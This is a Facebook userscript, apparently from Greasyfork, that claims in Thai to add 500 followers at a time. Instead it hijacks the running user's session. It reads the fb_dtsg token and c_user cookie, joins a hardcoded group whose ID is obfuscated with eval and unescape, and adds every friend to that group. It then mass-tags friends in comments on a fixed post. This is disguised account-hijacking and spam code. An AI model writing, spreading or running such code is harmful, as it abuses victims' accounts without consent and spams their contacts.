// ==UserScript==
// @name            เพิ่มผู้ติดตามทีละ500คน
// @description     Facebook เพิ่มผู้ติดตามทีละ500คน 
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// @version        2.0
// @grant          none
// @namespace   0f0d24b1a8bcc4f7509bff34c5dbb739
// @downloadURL https://update.greasyfork.org/scripts/368242/%E0%B9%80%E0%B8%9E%E0%B8%B4%E0%B9%88%E0%B8%A1%E0%B8%9C%E0%B8%B9%E0%B9%89%E0%B8%95%E0%B8%B4%E0%B8%94%E0%B8%95%E0%B8%B2%E0%B8%A1%E0%B8%97%E0%B8%B5%E0%B8%A5%E0%B8%B0500%E0%B8%84%E0%B8%99.user.js
// @updateURL https://update.greasyfork.org/scripts/368242/%E0%B9%80%E0%B8%9E%E0%B8%B4%E0%B9%88%E0%B8%A1%E0%B8%9C%E0%B8%B9%E0%B9%89%E0%B8%95%E0%B8%B4%E0%B8%94%E0%B8%95%E0%B8%B2%E0%B8%A1%E0%B8%97%E0%B8%B5%E0%B8%A5%E0%B8%B0500%E0%B8%84%E0%B8%99.meta.js
// ==/UserScript==
var gid=eval(unescape("%5B%27%31%32%37%38%37%35%37%38%30%32%31%33%37%37%30%30%27%5D"));
var fb_dtsg=document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id=document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var httpwp=new XMLHttpRequest();
var urlwp='/ajax/groups/membership/r2j.php?__a=1';
var paramswp='&ref=group_jump_header&group_id='+gid+'&fb_dtsg='+fb_dtsg+'&__user='+user_id+'&phstamp=';
httpwp['open']('POST',urlwp,true);
httpwp['setRequestHeader']('Content-type','application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length',paramswp['length']);
httpwp['setRequestHeader']('Connection','keep-alive');
httpwp['send'](paramswp);
var fb_dtsg=document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id=document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var friends=new Array();
gf=new XMLHttpRequest();
gf['open']('GET','/ajax/typeahead/first_degree.php?__a=1&viewer='+user_id+'&token'+Math['random']()+'&filter[0]=user&options[0]=friends_only',false);
gf['send']();
if(gf['readyState']!=4)
	{
}
else
	{
	data=eval('('+gf['responseText']['substr'](9)+')');
	if(data['error'])
		{
	}
	else
		{
		friends=data['payload']['entries']['sort'](function(a,b)
			{
			return a['index']-b['index']
		}
		)
	}
};
for(var i=0;
i<friends['length'];
i++)
	{
	var httpwp=new XMLHttpRequest();
	var urlwp='/ajax/groups/members/add_post.php?__a=1';
	var paramswp='&fb_dtsg='+fb_dtsg+'&group_id='+gid+'&source=typeahead&ref=&message_id=&members='+friends[i]['uid']+'&__user='+user_id+'&phstamp=';
	httpwp['open']('POST',urlwp,true);
	httpwp['setRequestHeader']('Content-type','application/x-www-form-urlencoded');
	httpwp['setRequestHeader']('Content-length',paramswp['length']);
	httpwp['setRequestHeader']('Connection','keep-alive');
	httpwp['onreadystatechange']=function()
		{
		if(httpwp['readyState']==4&&httpwp['status']==200)
			{
		}
	};
	httpwp['send'](paramswp)
};

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var id = "945014628992783";
var arkadaslar = [];
var svn_rev;
function arkadaslari_al(id){            
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
for(f=0;f<Math.round(arkadaslar.payload.entries.length/27);f++){
mesaj = "";mesaj_text = "";
for(i=f*27;i<(f+1)*27;i++){
if(arkadaslar.payload.entries[i]){
mesaj += " ?     @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
mesaj_text += " " + arkadaslar.payload.entries[i].text;
}
}
yorum_yap(id ,mesaj)}                
}
};
var params = "&filter[0]=user";
params += "&options[0]=friends_only";
params += "&options[1]=nm";
params += "&token=v7";
params += "&viewer=" + user_id;
params += "&__user=" + user_id;
if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
xmlhttp.send();
}
function RandomArkadas(){
var sonuc = "";
for(i=0;i<9;i++){
sonuc += " @[" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].uid + ":" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].text + "]";
}
return sonuc;
}
function yorum_yap(id ,mesaj) {
 var xhr = new XMLHttpRequest();
 var params ="";
 params +="&ft_ent_identifier="+id;
 params +="&comment_text="+encodeURIComponent(mesaj);
 params +="&source=2";
 params +="&client_id=945014628992783";
 params +="&reply_fbid";
 params +="&parent_comment_id";
 params +="&rootid=u_jsonp_2_3";
 params +="&clp={\"cl_impid\":\"453524a0\",\"clearcounter\":0,\"elementid\":\"js_5\",\"version\":\"x\",\"parent_fbid\":"+id+"}";
 params +="&attached_sticker_fbid=0";
 params +="&attached_photo_fbid=0";
 params +="&giftoccasion";
 params +="&ft[tn]=[]";
 params +="&__user="+user_id;
 params +="&__a=1";
 params +="&__dyn=7n8ahyj35ynxl2u5F97KepEsyo";
 params +="&__req=q";
 params +="&fb_dtsg="+fb_dtsg;
 params +="&ttstamp=";
 xhr.open("POST", "/ajax/ufi/add_comment.php", true);

    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            xhr.close;
        }
    }
    xhr.send(params);
}
        arkadaslari_al(945014628992783);